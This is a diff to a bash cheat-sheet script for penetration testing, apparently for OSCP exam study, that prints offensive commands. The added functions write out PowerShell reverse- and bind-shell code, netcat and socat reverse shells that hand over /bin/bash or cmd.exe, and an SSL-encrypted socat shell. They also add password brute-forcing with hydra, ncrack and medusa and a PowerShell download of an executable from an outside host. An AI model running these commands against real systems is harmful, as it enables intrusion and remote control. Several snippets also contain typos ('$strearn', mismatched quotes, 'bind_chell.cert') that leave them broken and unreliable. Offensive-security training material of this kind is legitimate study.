@@ -5,6 +5,9 @@
 #
 # https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
 
+if [ -z ${ip+x} ]; then ip=10.10.10.10 ; fi
+if [ -z ${port+x} ]; then port=4444 ; fi
+
 function show-tput-colors {
 for fg_color in {0..7}; do
         set_foreground=$(tput setaf $fg_color)
@@ -110,15 +113,15 @@ function help-brute () {
 echo ${reset}${red}${bold}
 echo RDP user with password list
 echo ${reset}${green}
-echo "ncrack -vv --user offsec -P passwords rdp://10.10.10.10"
+echo "ncrack -vv --user offsec -P passwords rdp://$ip"
 echo ${reset}${red}${bold}
 echo SSH user with password list
 echo ${reset}${green}
-echo "hydra -l user -P pass.txt -t 10 10.10.10.10 ssh -s 22"
+echo "hydra -l user -P pass.txt -t 10 $ip ssh -s 22"
 echo ${reset}${red}${bold}
 echo FTP user with password list
 echo ${reset}${green}
-echo "medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp"
+echo "medusa -h $ip -u user -P passwords.txt -M ftp"
 echo
 }
 
@@ -271,7 +274,7 @@ echo "    atftpd --daemon --port 69 /tftp"
 echo
 echo ${red}[2]   In reverse shell
 echo ${green}
-echo "    tftp -i 10.10.10.10 GET nc.exe"
+echo "    tftp -i $ip GET nc.exe"
 }
 
 
@@ -414,6 +417,7 @@ echo "wpscan --url http://playground.cyberpunk.rs:81 --wp-content-dir /wp-conten
 }
 
 function help-portchecking {
+
 echo ${red}${bold}
 if which figlet > /dev/null; then figlet Port Checkin;else echo Port Checking ; fi
 echo
@@ -521,10 +525,11 @@ echo
 function help-powershell {
 echo ${red}${bold}
 print-figlet Powershell
+echo ${white}
 echo Non-interactive execute powershell file
 echo ${reset}${green}
 echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1"
-echo ${red}${bold}
+echo ${white}
 echo Run file as another user with powershell.
 echo ${reset}${green}
 cat << "EOF"
@@ -533,7 +538,69 @@ echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >
 echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
 echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
 EOF
-echo 
+echo ${white}
+echo "Launch powershell as the admin whenever possible"
+echo ${reset}${green}
+echo "set-ExecutionPolicy Unrestricted"
+echo ""
+echo "get-ExecutionPolicy"
+echo ${white}
+echo "powershell file transfers"
+echo ${reset}${green}
+echo "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\bob\Desktop\wget.exe’)\""
+echo ${white}
+echo "Powershell reverse shell"
+echo ${reset}${green}
+cat << "EOF"
+$client = New-Object
+System.Net.Sockets.TCPClient('10.11.0.4',443);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName
+    System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + ’PS ’ + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $strearn.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+
+EOF
+echo ${reset}
+
+echo ${white}
+echo "Powershell bind shell"
+echo ${reset}${green}
+cat << "EOF"
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
+$listener.start();
+
+$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName
+    System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + ’PS ’ + (pwd).Path + ’> ';
+    $sendbyte =
+    ([text.encoding]::ASCII).GetBytes($sendback2);
+    $strearn.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+
+$client.Close();
+$listener.Stop()
+
+EOF
+
 }
 
 function help-proof {
@@ -595,7 +662,7 @@ function help-processes {
 function help-comparingfiles {
     echo ${red}${bold}
     echo "comparing files"
-    echo ${green}
+    echo ${reset}${green}
     echo "comm file1.txt file2.txt"
     echo
     echo "diff file1.txt file2.txt"
@@ -609,5 +676,88 @@ function help-comparingfiles {
     echo " D + P change in current to other"
 }
 
+function help-netcat {
+    echo ${red}${bold}
+    print-figlet "netcat"
+    echo ${reset}${white}
+    echo "using netcat to connect to a port"
+    echo ${green}
+    echo "nc -n -v $ip \$port"
+    echo ${white}
+    echo "Using netcat as a server/listener"
+    echo ${green}
+    echo 'nc -lnvp $port'
+    echo ${white}
+    echo "Connect to the listener with a client"
+    echo ${green}
+    echo "nc -nv $ip \$port"
+    echo ""
+    echo "Transfering files with netcat"
+    echo "nc -lnvp \$port > incomming.exe"
+    echo ""
+    echo "nc -nv $ip 4444 < /usr/share/windows/wget.exe"
+    echo ""
+    echo "You won't get any feedback when it's done"
+    echo ""
+    echo "Remote administration with -e by redirecting STDERR STDOUT and STDIN"
+    echo ""
+    echo "netcat bind shell"
+    echo ""
+    echo "nc -nvlp 4444 -e cmd.exe"
+    echo ""
+    echo "nc $ip 4444 "
+    echo "   You will catch the cmd.exe prompt"
+    echo ""
+    echo "Reverse shell scenario"
+    echo ""
+    echo "nc $ip 4444 -e /bin/bash"
+    echo ""
+    echo "When you connect to the shell you will receive the prompt"
 
+}
+
+function help-socat {
+    echo "${red}${bold}"
+    print-figlet "socat"
+    echo ${reset}${white}
+    echo "socat is colon delimited"
+    echo ${reset}${white}
+    echo "connecting with socat"
+    echo "socat - TCP4:${ip}:${port}"
+    echo ""
+    echo "- the hiphen is to pass stdin to the service"
+    echo ""
+    echo "starting a socat listener" 
+    echo ""
+    echo "sudo socat TCP4-LISTEN:443 STDOUT"
+    echo ""
+    echo "File transfers"
+    echo ""
+    echo "sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt"
+    echo ""
+    echo "socat TCP4:${ip}:${port} file:received_secret_passwords.txt,create"
+    echo ""
+    echo "socat reverse shells"
+    echo ""
+    echo "socat -d -d TCP4-LISTEN:$port STDOUT"
+    echo " -d -d increases the verbosity"
+    echo ""
+    echo "socat TCP4:$ip:$port EXEC:/bin/bash"
+    echo ""
+    echo "socat can also encrypt the contents of the communication"
+    echo ""
+    echo "create a cert with openssl"
+    echo "openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt"
+    echo ""
+    echo "cat bind_shell.key bind_chell.cert > bind_shell.pem"
+    echo "# socat requires the .pem"
+    echo ""
+    echo "create the ssl encrypted socat listener"
+    echo "sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash"
+    echo ""
+    echo "connect to the enrypted bind shell"
+    echo ""
+    echo "socat - OPENSSL:$ip:$port,verify=0"
+    echo " - passes STDIN to the connecting shell"
+}
 
